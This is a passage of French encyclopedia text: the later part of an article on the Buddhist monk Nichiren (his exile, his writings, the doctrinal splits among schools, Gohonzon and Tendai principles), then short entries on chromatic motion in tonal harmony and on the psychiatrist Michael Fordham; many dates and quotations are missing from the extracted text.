Une première manifestation de guerre civile commence par la révolte de Hōjō Tokisuke contre son plus jeune demi-frère, le régent Hōjō Tokimune, en , et les invasions étrangères se produisent quand les Mongols de Kubilai Khan attaquent le Japon par deux fois, en et . Ils furent repoussés, pourtant la question de la récompense des soldats ayant contribué à l'effort de guerre va miner la légitimité du pouvoir qui n'était pas en mesure de donner satisfaction à ses nombreux guerriers. La chute du shogunat de Kamakura fut en partie provoquée par les subventions exorbitantes que le gouvernement accordait à des rituels bouddhiques, dénoncés par Nichiren, destinés à la sécurité du pays, ce qui rendait impossible de payer les samouraïs qui auraient dû défendre le pays. Le caractère de plus en plus autoritaire du pouvoir des Hōjō, puis des luttes internes parmi l'élite de Kamakura vont achever de rendre le gouvernement shogunal impopulaire, y compris aux yeux de l'élite guerrière du Kantō.
En , ses prédictions ont donc été réalisées, cinquante-et-un ans après sa mort car, en définitive, les guerres dues aux invasions étrangères (1274 et 1281) et les guerres civiles dues aux luttes intestines (commencées en 1272) menèrent effectivement à la chute du clan Hōjō en 1333 conformément aux mises en garde et aux prédictions de Nichiren à Hōjō Tokiyori dans son écrit “Sur l’établissement de l’enseignement correct pour la paix dans le pays”.
Va s’ouvrir alors une nouvelle époque qui plongera tout le pays dans des siècles de guerres et luttes internes : Takauji Ashikaga est victorieux dans la guerre de Genkō, guerre civile commencée en qui va précéder la période Nanboku-chō et l'apparition du shogunat Ashikaga. Il a participé activement à la chute du shogunat de Kamakura pour le compte de l'empereur Go-Daigo et s'arroge rapidement le titre de shogun pour exercer le pouvoir durant la courte période de la Restauration de Kenmu (1333-1336).
En mars , Nichiren fut gracié et autorisé à revenir à Kamakura. Le gouvernement chercha, par le biais de Hei no Seamon, commandant en second des forces militaires et de police, de rallier Nichiren à leur cause en lui offrant un temple en échange de ses prières contre l'invasion mongole.
Nichiren refusa tout compromis et insista une fois de plus sur la nécessité pour le gouvernement de supprimer son soutien aux enseignements qui obscurcissaient le “"Dharma" correct”. Voyant que sa troisième remontrance faite au gouvernement ne provoquait aucun écho, Nichiren se retira dans les montagnes et forêts. Le , il quitta Kamakura en compagnie de ses disciples pour établir son ermitage sur le mont Minobu, puisque, selon Confucius, au bout de trois interventions infructueuses, le sage se retire.
Lors de sa retraite, Nichiren se consacra à la formation de ses disciples et à la correspondance d'encouragement avec ses partisans. C'est là que lui parvinrent les nouvelles des deux tentatives d'invasion du Japon par les Mongols, en puis en . Bien que le Japon fut sauvé les deux fois par des tempêtes qui détruisirent la flotte mongole, Nichiren continua à mettre en garde le shogunat. En effet, les conditions spirituelles, qui avaient rendu le Japon vulnérable, n'ayant pas changé, elles conduiraient inévitablement à la souffrance du peuple japonais.
Le , il arriva à la maison d’Hagiri Rokuro, un de ses disciples, qui lui offrit un lopin de terre sur le mont Minobu. En , Nichiren fit construire une petite cabane et un temple dans lesquels il demeura huit ans. Bien que l'ermitage de Nichiren au mont Minobu soit situé au beau milieu d’une forêt dense en un endroit difficile d'accès, Nichiren reçut de nombreuses visites de ses disciples et d’adeptes venant de tout le pays. Aujourd’hui, à cet endroit, se trouve le temple Kuon-ji, siège patriarcal de la Nichiren Shū.
Nichiren eut également à souffrir des persécutions dirigées contre ses disciples dont le sort l’a toujours beaucoup préoccupé. La pire fut celle d'Atsuhara en , lorsque vingt fermiers furent arrêtés sur ordre du shogunat et trois d'entre eux décapités, parce qu'ils refusaient d'abjurer leur foi dans le "Sūtra du Lotus". Nichiren a constamment prié pour le bien-être de ses adeptes et leur envoya un grand nombre de lettres d'encouragement. Cette persécution bouleversa tellement Nichiren qu'il écrivit alors à un de ses plus proches disciples une lettre intitulée “Sur les persécutions subies par le Sage” le premier jour du dixième mois de la deuxième année de Kōan (1279).
Derniers enseignements et controverses.
Il écrivit aussi lors de sa retraite, les deux derniers de ses cinq écrits majeurs. Le , il rédigea le "Senji shō" où il reprend les cinq guides de propagation. Ce traité met particulièrement l'accent sur le fait que le temps était maintenant venu pour propager le "Sūtra du Lotus", le privilégiant aux autres "sūtra" et que la libération des souffrances pouvait être obtenue par la pratique de "Nam(u) myōhō renge kyō".
Après le décès de Nichiren, une scission s’est produite. Certaines différences subsistent au à commencer par le titre qui est apposé à son nom (voir la section “Titres respectueux et posthumes”).
Reconnaissant Shakyamuni en tant que “Bouddha historique”, les membres de la Nichiren Shōshū et de la Sōka Gakkai internationale donnent le titre de “bouddha fondamental” et de “bouddha de l'époque de la Fin de la Loi” à Nichiren. La Nichiren Shū, quant à elle, considère le bouddha Shākyamuni comme le “bouddha originel et éternel”, et Nichiren comme la réincarnation du bodhisattva Jōgyō qui, selon les écrits, doit propager le "Sûtra du Lotus" lors de la période de "Mappō": la dernière des Trois Époques qui suivent la mort du bouddha Shākyamuni après les époques de la Loi correcte ("Shōhō" : 正法) et de la Loi formelle ("Zōhō" : 像法) au cours desquelles le bouddhisme sombrant dans la confusion sous l’influence des Trois Poisons, son enseignement perd son pouvoir de guider les gens vers la bouddheité.
Cette différence a un effet significatif sur l'accent mis à l'enseignement. En effet, tandis que la Nichiren Shōshū et la Sōka Gakkai internationale préfèrent étudier les enseignements de Nichiren appelés "Les Écrits de Nichiren"&lt;ref name="wnd-1/toc"&gt;https://www.nichirenlibrary.org/fr/wnd-1/toc&lt;/ref&gt; ou "Gosho", la Nichiren Shū estime, elle, que tous les "gosho" ne sont pas de même valeur, certains selon elle n'étant pas authentiques, et que le "Sūtra du Lotus" doit donc être l'objet principal d'étude.
Une autre différence se glisse entre les différentes écoles nichireniennes sur la méthode de propagation du "Sūtra du Lotus" : la Nichiren Shōshū et la Sōka Gakkai internationale ont prôné davantage la méthode de "shakubuku" ou de "shoju" pour propager la "Loi correcte" comme l’a enseigné Nichiren notamment dans son traité "Sur l'ouverture des yeux" (Écrit 30, ). La Nichiren Shū, quant à elle, réfute cette première méthode et préfère transmettre l’enseignement du "Sūtra du Lotus" par le “moyen habile” décrit par Shākyamuni dans le chapitre de ce texte, soit par l'utilisation du kōsen-rufu. La pratique du "shakubuku" correspond à “la pratique pour soi et pour les autres” ("Jigyo-Keta") de la Sōka Gakkai, ce terme en est venu à désigner toute sorte de propagation, sans distinction de méthode.
Nichiren écrivit aussi le "Hōon shō" en , après la mort de Dozen-bō, son Maître qui l'avait ordonné et guidé dans son enfance. Dans ce traité, Nichiren insiste sur le fait que la pratique bouddhique doit être motivée par le désir de libérer tous ceux à l'égard de qui on a une dette de gratitude et que la meilleure façon pour cela est de leur enseigner le "Sūtra du Lotus". C'est dans le "Hōon shō" (ÉCRIT 88. Sur l’acquittement des dettes de reconnaissance) que Nichiren décrit également pour la première fois les « Trois grands "Dharma" cachés » ou Trois Grandes Lois sacrées et révélées dites « ésotériques » : le "Gohonzon" (objet de culte), le "Daimoku" (invocation) et le "Kaidan" (estrade d'ordination, où se tiennent les cérémonies d’ordination du clergé bouddhiste).
Bien qu’il n’en subsiste aucune mention dans ses écrits, le Nichiren aurait légué au monde entier l'inscription, sur un grand support en bois, du "Dai-Gohonzon", une représentation en grand format du mandala de Nichiren, le "Gohonzon", constitué par les mentions écrites des noms de bouddhas, bodhisattvas et divinités protectrices ainsi que d’autres archétypes représentant les dix états de vie (systématisés par le Grand Maître Tiantai), avec, en son centre, verticalement, le mantra "Nam(u) Myōhō Renge Kyō". La Nichiren Shōshū y voit l'accomplissement du but de la venue de Nichiren en ce monde et fait de ce "Gohonzon" l'une des “Trois Grandes Lois cachées” (et révélées pat Nichiren). Les autres écoles issues de Nichiren comme la Nichiren Shū et la Soka Gakkai internationale contestent les fondements historiques de cette affirmation, Nichiren n’y faisant allusion dans aucune de ses lettres. Le "Dai-Gohonzon" est conservé au Taiseki-ji.
Voyant sa santé décliner en raison des nombreuses difficultés et des persécutions subies pendant des années, Nichiren quitta le mont Minobu le . Ses disciples l'avaient persuadé de se rendre aux sources chaudes aux vertus médicinales d’Hitachi mais il dut s'arrêter en chemin chez un de ses adeptes dévoués à Tōkyō dans le quartier d’Ikegami. Le , à l'âge de , Nichiren mourut entouré de ses principaux disciples et adeptes laïques. Les cendres de Nichiren, selon ses vœux, furent aussitôt transférées par ses disciples au temple Kuon-ji sur le mont Minobu. Un temple fut aussi construit sur les lieux de la mort de Nichiren à Tōkyō, le temple Honmon-ji.
D'après la Nichiren Shōshū et la Sōka Gakkai internationale, le , cinq jours avant sa mort, Nichiren aurait désigné le jeune Nikkō, comme son successeur légitime demandant aux moines aînés de suivre dorénavant son enseignement. Cette affirmation est contestée par l'un des principaux courants nichireniens. Selon la Nichiren Shū, Nichiren aurait nommé les « Six Disciples Aînés » pour leur confier la propagation de son enseignement après sa mort.
Nikkō Shonin a consigné un certain nombre d'enseignements oraux de Nichiren, rassemblés dans un "Recueil des Enseignements oraux" .
Écrits de Nichiren.
"Gosho".
Le mot "Gosho" est formé de deux mot : "Go" qui est un préfixe honorifique et "Sho" qui signifie littéralement "Écrit(s)". Le mot "Gosho" se traduit donc par "Vénérables Écrits" ou "Grands Écrits" et sont les écrits, séparés (un "gosho") ou rassemblés (le "Gosho"), de Nichiren.
Il subsiste aujourd'hui plus de sept cents écrits de Nichiren, y compris des copies et des fragments. L'authenticité de quelques-uns est contestée par certaines écoles nichireniennes, même quand elles reconnaissent l'orthodoxie du contenu. Toutefois quelques écrits sont suspectés être des faux fabriqués par des successeurs désireux de se donner une légitimité. Il subsiste, aujourd'hui, deux recueils rassemblés par les premiers disciples de Nichiren : celui de Nikkō et celui de Nichijo, également connu sous le nom de Toki Jōnin.
À l'heure actuelle, il existe trois éditions accessibles au public.
Le "Showa Teihon Nichiren Shōnin Ibun" édité en 4 volumes par le Centre d'Études du Bouddhisme de Nichiren de l'Université Risshō situé au Mt Minobu et appartenant à la Nichiren Shū. Il s'appuie sur le "Rokunai Gosho" qui remonterait à Toki Jōnin.
La deuxième édition est le "Nichiren Daishōnin Gosho Zenshu" éditée par la Sōka Gakkai et la Nichiren Shōshū en , sous la direction du Grand-Patriarche, Nichiko Shōnin. Cette traduction, qui s'appuie non seulement sur les originaux mais également sur les annotations en marges, est à la base d'un certain nombre de divergences doctrinales entre le courant de la Nichiren Shōshū et celui de la Sōka Gakkai et les écoles d'une autre obédience, telle la Nichiren Shū, qui suivent le "Showa Teihon".&lt;br&gt;
Enfin, la troisième version est le "Heisei Shinpen Nichiren Daishōnin Gosho" édité par le Temple principal de la Nichiren Shōshū en . C'est une révision totale des écrits du "Gosho Zenshu" et du "Showa Shintei Gosho", version chronologique éditée en , sous le Grand-Patriarche, Nittatsu Shōnin. De nouveaux textes ont été ajoutés et d'autres, dont l'authenticité est controversée, supprimés. Cette édition suit l'ordre chronologique et est en style kakikudashi-bun. Néanmoins, la Nichiren Shōshū a prévu l'édition des "goshos" en style d'origine.
Une traduction complète en anglais a été éditée en un premier volume, en : "The Writings of Nichiren Daishōnin", améliorant les anciens "Major Writings of Nichiren Daishonin" en 7 volumes, ainsi qu’un volume II ; ils sont en libre accès sur Internet.&lt;br&gt;
De même, en français, "Les Écrits de Nichiren" en un volume ont été traduits et publiés (écrits 1 à 172) en 2011.
Écrire contre l’inaction des autorités.
Le style d'écriture utilisé dans les traités de Nichiren est le style kanbun, un style d'écriture formelle sur le modèle classique chinois qui a été la langue du gouvernement et de l'apprentissage dans le Japon contemporain. Nichiren a également écrit des lettres aux disciples et aux fidèles laïques dans un style mixte kanji-kana vernaculaire ainsi que des lettres en kana simple pour les croyants qui ne pouvaient pas lire les styles les plus formels, en particulier les enfants.
Certaines œuvres de Nichiren, en particulier “Sur l’établissement de l’enseignement correct pour la paix dans le pays”, le "Risshō Ankoku ron", sont considérés comme des exemplaires de référence du style kanbun. Ce texte et plusieurs autres lettres font preuve d'une empathie inhabituelle pour l’époque de Kamakura, s’agissant de la compréhension des malheurs du peuple et des opprimés à cette époque extrêmement troublée () politiquement, socialement (), économiquement () et religieusement (), alors que les autorités gouvernementales et les principaux dirigeants religieux, issus de l’aristocratie, se querellent pour le pouvoir.
Parmi les écrits ("gosho") célèbres figurent ceux adressés aux femmes croyantes que Nichiren a souvent félicitées pour leurs questions en profondeur sur le bouddhisme, tout en les encourageant dans leurs efforts pour atteindre l'Illumination dès cette vie-ci.
Au cours des dix dernières années de sa vie, il continue à encourager ses disciples et en forme de nouveaux depuis le mont Minobu où il s’est retiré. Six disciples ont succédé à Nichiren, parmi lesquels , , et qui développa la Nichiren Shōshū (littéralement ). Il a recueilli et compilé les enseignements oraux de son maître ("").
L'ensemble des écoles se réclamant de l'enseignement de Nichiren sont regroupées en tant que bouddhisme de Nichiren. Actuellement, les principales écoles de la branche sont la Nichiren Shū, la Nichiren Shōshū, et les mouvements bouddhistes laïques plus récents tels que la Sōka Gakkai, le Risshō Kōsei Kai ou le bouddhisme Reiyukai.
Des observateurs modernes découvrent aussi dans la lecture des écrits de Nichiren un message politique. En effet, pendant la période pré-Seconde Guerre mondiale, le gouvernement japonais a insisté pour que des passages et même des documents soient supprimés dans les collections publiées parce qu'elles étaient considérées comme insultantes pour l'empereur japonais. Il faut dire qu'en son temps déjà, peu connu pour son conformisme, Nichiren n'hésitait pas dans ses écrits à faire montre d'un certain manque de modestie à l'endroit du souverain. On lit par exemple dans l’une de ses lettres : 
Les femmes dans le contexte nichirenien.
Nichiren a déclaré que les femmes également peuvent atteindre l'Illumination. Considérée dans le contexte de la société japonaise du , cette position doctrinale sur les femmes a été réellement révolutionnaire. Socialement, les femmes japonaises étaient considérées comme des citoyennes qui, juridiquement, n’avaient que peu de pouvoir. Dans le monde religieux, les femmes étaient vues comme des êtres secondaires ; la majorité des écoles bouddhistes de cette époque discriminaient ouvertement les femmes, et nombre de ces écoles avaient un point de vue misogyne.
Nichiren, d'autre part, s'exprima sur l'Éveil en disant que "la foi, et non le sexe, est le principal déterminant de l'illumination […] des différences physiques ne gênent en aucune façon le salut bouddhiste." Alors que bon nombre de contemporains bouddhistes ont rarement écrit pour les femmes, environ un cinquième des œuvres existantes de Nichiren ont été adressées à des femmes. De plus, environ 30 % des bénéficiaires du Gohonzon étaient des femmes. Les écrits de Nichiren contiennent à la fois la position doctrinale des femmes au sein du mouvement ainsi que des conseils pratiques aux femmes des croyants. Il considérait le mariage comme un partenariat complémentaire, et en parlant de la maternité, il mentionna presque toujours le rôle et les obligations des pères dans l'unité de la famille.
Dans l'ensemble, Nichiren a enseigné à ses disciples la dignité inhérente à l'être humain et une égalité spirituelle, indépendamment de leur sexe ou leur classe sociale. Cela peut s'expliquer par son identification facile avec les plus défavorisés, puisque selon les écrits, il est issu d'une des castes les plus basses du Japon.
Pensée et enseignement.
Selon le "Dictionnaire encyclopédique du bouddhisme "de Philippe Cornu : 
L’interdépendance de tous les phénomènes.
À propos du principe d’interdépendance de tous les phénomènes : 
Mappo et Kosen-rufu.
Nichiren s’appuie sur le chapitre XXIII du "Sûtra du Lotus" où le Bouddha déclare ce qui est à la fois son grand vœu et un décret pour l’époque de la Fin de la Loi : 
S’appuyer sur la Loi et non sur les personnes : dans l’enseignement de Nichiren, la Loi bouddhique se réfère à la Loi merveilleuse de Nam-myoho-renge-kyo pour l’époque de la Fin de la Loi. 
Trois Grandes Lois sacrées et révélées.
Gohonzon.
Le mot "Gohonzon" est formé de deux mots, "Go" qui est un préfixe honorifique et "Honzon" qui signifie "Objet de vénération". Le mot "Gohonzon" se traduit donc par “Objet fondamental de vénération” et est l’une des Trois Grandes Lois cachées ou «sacrées et révélées» dans le Sūtra du Lotus enseigné par le bouddha Shākyamuni au cours des huit dernières années de sa vie.
Dans le bouddhisme de Nichiren, le terme revêt une importance particulière car il désigne les représentations écrites que Nichiren a commencé à tracer sur l’île de Sado où il était en exil après la "Persécution de Tatsunokuchi". Le "Gohonzon" de l'Enseignement essentiel. Le "Gohonzon" est l’une des Trois Grandes Lois exposées implicitement “entre les lignes du Sūtra du Lotus” que Nichiren révèle afin de “ne pas laisser se tarir le flot de "kosen rufu"”, conformément au grand vœu exprimé par le bouddha Shākyamuni dans le chapitre XXIII du "Sūtra du Lotus".
Au début, les 'Gohonzon' inscrits par Nichiren étaient remis nominativement à des disciples afin qu’ils s'en imprègnent durant leur pratique bouddhique. On les appelle "Ikki Ichi En". De par l’inscription effectuée sur un rouleau de papier il représente l’expérience de l’Éveil spirituel transférée sur un support relevant du règne du non-sensitif. (Actuellement le "Gohonzon" des fidèles est, dans certaines écoles, obligatoirement consacré par une "Cérémonie d'ouverture des yeux").
Il existe plusieurs sortes de mandalas représentant le "Gohonzon". On distingue les "Joju-gohonzon" qui comportent le nom du bénéficiaire inscrit dans la marge, les "Okatagi-gohonzon", mandalas imprimés ayant reçu la cérémonie d'ouverture des yeux, et les "Omamori-gohonzon" de taille réduite que l'on utilise surtout lors de déplacements.
La Nichiren Shū définit le "Gohonzon" de la façon suivante :
La Soka Gakkaï internationale, représentée en France par le mouvement bouddhiste Soka, considère tout "Gohonzon" comme la concrétisation de "Nam-myoho-renge-kyo", essence du Sûtra du Lotus et la réponse unique aux Quatre Souffrances fondamentales (naissance dans un monde troublé, maladie, vieillesse et mort) par le "Daimoku" qui y est inscrit en son centre, tandis que la Nichiren Shōshū, enseigne que tout "Gohonzon" se rattache au "Dai-Gohonzon" que Nichiren aurait inscrit ou fait inscrire le , c'est-à-dire que les "Gohonzon" confiés aux pratiquants sont des transcriptions du "Dai-Gohonzon" faites par les grands patriarches de la Nichiren Shōshū, ainsi le "Dai-Gohonzon" constituerait le cœur des Trois Grandes Lois ésotériques (cachées ou sacrées et révélées) dans le Sūtra du Lotus, but de la venue de Nichiren en ce monde.
Les "Gohonzon" prennent la forme d'un mandala tracé sur papier à l'encre "sumi" (encre de Chine) ou sur bois avec des caractères dorés. Au centre du "Gohonzon" est écrit : “"Nam-myōhō-renge-kyō" - Nichiren” indiquant l'identité de la Personne et de la Loi : le Bouddha et le Dharma sont inséparables et ne font qu'un.
La Sōka Gakkai et la Nichiren Shōshū utilisent les citations des écrits de Nichiren qui évoquent l'inscription du "Gohonzon", notamment :
« C'est ma propre vie à moi, Nichiren, qui devient l'encre "sumi" avec laquelle je calligraphie ce "Gohonzon". Vous devez donc croire en ce "Gohonzon" de tout votre cœur. La volonté du bouddha Shākyamuni est le "Sūtra du Lotus" mais l'âme de Nichiren n'est autre que "Nam-myōhō-renge-kyō". »&lt;br&gt;"Écrits", 415, Réponse à Kyōo (août 1273)
&lt;br&gt;"Écrits", 839, La composition du "Gohonzon" (août 1277)
"Kaidan".
Initialement estrade d’ordination pour le clergé, ce terme désigne pour les laïcs le lieu de pratique en tant que lieu sacré où est enchâssé le "Gohonzon". Au domicile du pratiquant ou dans un lieu de culte, c’est le lieu de pratique de "Gongyo" et "Daimoku".
Principes Tendai.
Non-dualités.
Non-dualité des êtres et de leur environnement (ou non-dualité de la vie et de son environnement).
Principe formulé par Miaole (Zhanran) en commentaire du "Sens profond du Sūtra du Lotus" ("Hōkke Genji" [法华玄義]) de Tiantai (Zhiyi) sur « la véritable identité de tous les phénomènes » ou "shōhō jossō"（諸法実相). Ce principe est appelé "eshō funi"（依正不二）en japonais. "Eshō" (依正) est une contraction de "ehō", l’environnement non sensible ou le monde objectif, et "shōhō", l’être vivant ou le monde subjectif. "Shō" de "shōhō" signifie « sujet » et "e" de "ehō" « dépendre », c’est-à-dire que la vie dépend de son environnement pour survivre. "Hō" dans les deux cas veut dire “effet manifeste” [ou rétribution], indiquant que la rétribution karmique d’un individu apparaît dans la réalité subjective aussi bien qu’objective. "Funi" (不二) est une abréviation pour "nini-funi" (2 mais non 2) et "funi-nini" (non 2 mais 2) ; ces expressions signifient que la vie et son environnement sont deux phénomènes indépendants mais un dans leur essence fondamentale.&lt;br&gt;Du point de « la véritable entité de tous les phénomènes », la distinction entre soi et le monde objectif appartient à la dimension de « tous les phénomènes » et leur unité essentielle à celle de « la véritable entité ». Comme la vie et son environnement sont deux expression de la même entité, l’individu, "shōhō", est formé ou influencé par l’environnement, "ehō", et inversement, la condition de vie d’un individu peut aussi affecter l’environnement.&lt;br&gt;Nichiren cite ce principe dans les écrits suivants : Sur l’atteinte de la bouddhéité en cette vie (1), Sur l’établissement de l’enseignement correct pour la paix dans le pays (2), Lettre à Hōren (62), Sur les présages (79), La personne et la Loi (161).&lt;br&gt;
 (Sur les présages, ÉCRIT 79, 649).
Non-dualité du corps et de l’esprit.
Principe expliquant les deux phénomènes apparemment distincts du corps, l’aspect physique de la vie, et de l’esprit, son aspect sprirituel, comme les deux phases d’une même entité. Principe formulé par Miaole (Zhanran) en commentaire du "Sens profond du Sūtra du Lotus" ("Hōkke Genji" [法华玄義]) de Tiantai (Zhiyi) sur « la véritable identité de tous les phénomènes » ou "shōhō jossō" （諸法実相). Ce principe s’énonce "shikishin funi"（色心不二). "Shiki" désigne ce qui a une forme, une couleur ou qui est extérieurement manifeste, c’est-à-dire les phénomènes physiques ; tandis que "shin" désigne le mental, l’esprit, tout ce qui est intérieur et invisible, c’est-à-dire les phénomènes spirituels. "Funi" est une abréviation pour "nini-funi" (2 mais non 2) et "funi-nini" (non 2 mais 2). Cela veut dire que le matériel et le spirituel sont deux catégories distinctes sur le plan des phénomènes mais qu’ils sont inséparables et un en essence.&lt;br&gt;En termes de « véritable entité de tous les phénomènes », Tien-t’ai (Zhiyi) considère la distinction entre matériel et spirituel comme relevant du niveau de « tous les phénomènes » et leur unité essentielle, de celui de la « véritable entité ». L’unité du corps et de l’esprit, ou du matériel et du spirituel, est une expression de la véritable entité ou de l’ultime réalité de la vie.&lt;br&gt;Nichiren cite ce principe notamment dans : Ouvrir les yeux des représentations sculptées ou peintes [du Bouddha] (ÉCRIT 11, 87) : 
Dix mondes ou dix états de vie.
Ces dix états de vie sont, du plus bas au plus élevé, les suivants :
On parle aussi parfois des dix mondes qui sont alors énumérés comme suit :
Selon le principe d’inclusion mutuelle des dix états, chacun des dix états contient les dix états, chaque monde contient les dix mondes : L’objet de vénération pour observer l’esprit, Écrit 39, 363.
Dix facteurs.
Le principe clarifiant les facteurs communs à toute vie est énoncé dans le deuxième chapitre, “Moyens opportuns”, du "Sūtra du Lotus". Les dix facteurs de vie dans chacun des dix états (systématisés par Zhiyi) sont énumérés comme suit : apparence, nature, entité, pouvoir, influence, cause inhérente, relation, effet latent, effet manifeste et leur cohérence du début jusqu’à la fin. 
Trois niveaux d’existence.
Trois angles sous lesquels l’être vivant est appréhendé :
Trois mille mondes en un instant de vie ("Ichinen sanzen").
"Ichinen sanzen"（jp : 一念三千) : système philosophique établi par le Grand Maître Tiantai. « Les trois mille mondes » indique les divers aspects et phases que la vie revêt à chaque instant. À chaque instant, la vie manifeste l’un des dix mondes (ou dix états). Chacun de ces mondes possède en soi le potentiel des dix autres, créant ainsi la possibilité de cent mondes. Chacun de ces cent mondes possède les dix facteurs et opère au sein des trois niveaux d’existence, ce qui conduit à trois mille mondes. Ce concept est cité dans plusieurs écrits :
Les deux moitiés du "Sūtra du Lotus".
Zhiyi, de même que Nichiren par la suite, se réfèrent à la subdivision faite entre « les deux moitiés du sūtra » tandis que la première moitié du sūtra (chapitres I à XIV) est nommée « enseignement théorique », la deuxième moitié contient l'« enseignement essentiel du Bouddha ».
L'école Tiantai présente les quatorze derniers chapitres comme l’« enseignement essentiel » du "Sūtra du Lotus", toutefois Nichiren utilisera l'expression pour désigner l’enseignement ultime contenu dans le chapitre XVI, "Nam-myōhō-renge-kyō", qu'il recommande d'utiliser en cette période de Fin de la Loi : 
Les « bodhisattvas sortis de la terre ».
Les « bodhisattvas sortis de la terre » ou “Bodhisattvas de la Terre” () apparaissent dans le chapitre XV, “Surgir de terre”, du "Sūtra du Lotus", considéré comme le premier chapitre de l’enseignement essentiel (les chapitres XV à XXVIII).
Parmi la multitude de bodhisattvas sortis de la terre, quatre guides se distinguent: , , et .
Interloqués par leur apparition soudaine et leur nombre incommensurable, le bodhisattva Maitreya et d’autres demandent d’où ils proviennent. Le Bouddha répond que, depuis le plus lointain passé, il les a tous instruits, convertis et guidés après avoir atteint l’Éveil. Solennellement il leur confie la mission de propager l’essence du Sūtra, la Loi merveilleuse, à l’époque de la Fin de la Loi.
Par opposition aux « bodhisattvas de l’enseignement théorique », ces bodhisattvas de l’enseignement essentiel ont donc été instruits par le véritable Bouddha, c’est-à-dire le bouddha dont la véritable identité est révélée dans l’enseignement essentiel du sūtra : Shakyamuni y révèle sa véritable identité de bouddha qui a atteint l’illumination dans le très lointain passé. Les bodhisattvas sortis de la terre, qui sont des disciples qu’il a formés dans cet esprit depuis le temps de son illumination, sont également des « bodhisattvas de l’enseignement essentiel ».
Titres respectueux et posthumes de Nichiren.
Après sa mort, Nichiren a été nommé sous des noms posthumes destinés à exprimer le respect envers sa personne ou pour représenter sa position dans l'histoire du bouddhisme. “Nichiren Shōnin”, pour la Nichiren Shū, se traduisant par “Saint Nichiren” ou “Sage Nichiren”, également traduit, en dehors du contexte nichirenien, par “le révérend Nichiren” ou “le prêtre Nichiren”. Il est aussi appelé “Nichiren Daishōnin” ce qui se traduit par “Grand Sage Nichiren” ; ce titre honorifique dépend généralement de l'institution se réclamant de Nichiren, mais il est préféré par les disciples des écoles de la “lignée de Nikkō Shonin”, c'est-à-dire par la Nichiren Shōshū et utilisé fréquemment par la Sōka Gakkai et la Soka Gakkai internationale ou, tout simplement, Nichiren (par exemple la récente traduction des "écrits de Nichiren" par la SGI).
Les bouddhistes de Nichiren au Japon se réfèrent toujours à Nichiren en utilisant une de ces formes respectueuses, par exemple “le Daishōnin”, tant la marque de respect attribuée à la personne concernée est culturellement importante dans ce pays.
La Cour impériale de Kyoto a également décerné à Nichiren, les appellations honorifiques de Nichiren Daibosatsu en 1358 et de "Risshō Daishi" en .
Nichiren et le jeu de go.
Nichiren est considéré par certains comme un maître du jeu de go en son temps. Greg Schneider, chercheur en théologie à l'Université du Wisconsin, écrit :

</doc>
<doc id="248679" url="https://fr.wikipedia.org/wiki?curid=248679" title="Mouvement chromatique">
Mouvement chromatique

En harmonie tonale, un mouvement chromatique — appelé également chromatisme — est un cas particulier de mouvement mélodique obligé réalisé entre trois sons successifs séparés par deux demi-tons "inégaux" — le premier, chromatique, le deuxième, diatonique — mais de "même sens". 
Les trois sons en question — note préparatoire, note attractive et note résolutive — forment donc un intervalle de seconde majeure — soit, un ton.
La différence entre le demi-ton diatonique et le demi-ton chromatique n'est pas seulement d'ordre théorique. En effet, le demi-ton chromatique, le plus "expressif" des deux, introduit une "tension" en amenant la note chromatique. Cette tension va trouver sa résolution grâce au pouvoir "attractif" du demi-ton diatonique. Par ailleurs, le demi-ton diatonique est "en principe" plus petit que le demi-ton chromatique.
La réalisation du mouvement chromatique nécessite un certain nombre de précautions, sous peine de produire un effet un peu dur, appelé fausse relation chromatique. 
Note chromatique.
La note chromatique est la note attractive d'un mouvement chromatique. Étant étrangère à la tonalité, la note chromatique doit être accidentellement altérée. Selon le sens du mouvement, elle pourra être altérée de deux manières.
Lorsque le mouvement chromatique est "ascendant" (exemples A et C), l'altération est le plus souvent ascendante : 
Lorsque le mouvement chromatique est "descendant" (exemple B), l'altération est le plus souvent descendante :
Harmonisation de la note chromatique.
La note chromatique peut être harmonisée de plusieurs manières selon qu'elle est note réelle ou note étrangère.
Note réelle d'un accord.
Lorsqu'elle est note réelle d'un accord, la note chromatique — dissonance constitutive ou sensible — peut être harmonisée de manière différente selon qu'elle est "ascendante" ou "descendante".
Note étrangère.
Lorsqu'elle est note étrangère, la note chromatique peut être harmonisée de manière différente selon qu'elle est "ascendante" ou "descendante". Dans les deux cas, la note chromatique constitue une dissonance plus ou moins passagère, pouvant être définie, soit comme une note de passage, soit comme une appoggiature.

</doc>
<doc id="248680" url="https://fr.wikipedia.org/wiki?curid=248680" title="Michael Fordham">
Michael Fordham

Michael Fordham (Kensington (Londres), - Buckinghamshire, ) est un psychiatre et psychothérapeute anglais qui commença sa carrière dans le service de guidance infantile de Londres, puis se forma à la psychologie analytique auprès de la "Society of Analytical Psychology", dont il devint un membre éminent. Il fut pionnier dans l'élaboration d'une théorie du développement du bébé et de l'enfant reposant sur les concepts de la psychologie analytique créée par Carl Gustav Jung. Il devint par la suite membre d'honneur de la British Psychological Society et membre fondateur du Collège royal de psychiatrie'. Il est le premier rédacteur du "Journal of Analytical Psychology", et coéditeur des "Collected Works" de Carl Gustav Jung.
Il laisse derrière lui une œuvre importante, dont une théorie du développement du nourrisson qui mérite un chapitre à part, ainsi que le fruit de son travail avec les enfants autistes qui l'a amené à développer l'idée des défenses du soi. Il a travaillé toute sa carrière avec les psychanalystes de l'école Kleinienne dont il se sentait proche, et aussi avec Donald Winnicott avec qui ses relations furent franches et amicales.
Développement du nourrisson.
Le soi primaire.
Pour Michael Fordham l'état psycho-sensori-moteur du nouveau-né (voire du fœtus intra-utero en fin de grossesse) est un état d'homéostasie indifférenciée : il n'y a pas de différenciation entre moi et non-moi, entre l'interne et l'externe, entre différentes composantes du monde interne. C'est cet état qu'il a nommé soi primaire, faisant ainsi référence au concept jungien du soi, archétype de la totalité. Il a travaillé sur ce modèle dès 1947.
La dé-intégration.
Cependant cet état d'homéostasie n'est pas un état permanent : le nourrisson est soumis à de nombreuses sollicitations, tant internes qu'externes, qui menacent et parfois rompent cet état d'équilibre. Alors, selon Fordham, les potentialités archétypiques du tout petit sont activées, entraînant une activité psycho-motrice du bébé qui, quand l'environnement est présent, aboutissent à ce que celui-ci apporte une réponse aux besoins de son bébé. Cette activité psycho-motrice du bébé correspond au geste spontané décrit par Donald Winnicott, ainsi qu'à la compétence innée du nourrisson décrite depuis les années 1990 par les cognitivistes.
